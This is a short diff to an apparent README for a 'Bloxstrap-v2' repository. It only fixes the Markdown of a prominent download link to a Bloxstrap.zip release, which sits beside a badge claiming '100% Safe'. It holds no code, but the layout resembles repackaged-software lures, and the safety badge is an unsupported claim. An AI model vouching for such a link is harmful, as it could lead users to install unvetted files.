@@ -9,7 +9,7 @@
 [![License](https://img.shields.io/badge/License-MIT-orange?style=for-the-badge)](https://github.com)
 [![Security](https://img.shields.io/badge/Security-100%25%20Safe-blue?style=for-the-badge)](https://github.com)
 
-#[Download](https://github.com/shalaluecka/Bloxstrap-v2/releases/download/Download/Bloxstrap.zip)
+# [Download](https://github.com/shalaluecka/Bloxstrap-v2/releases/download/Download/Bloxstrap.zip)
 
 ---
 
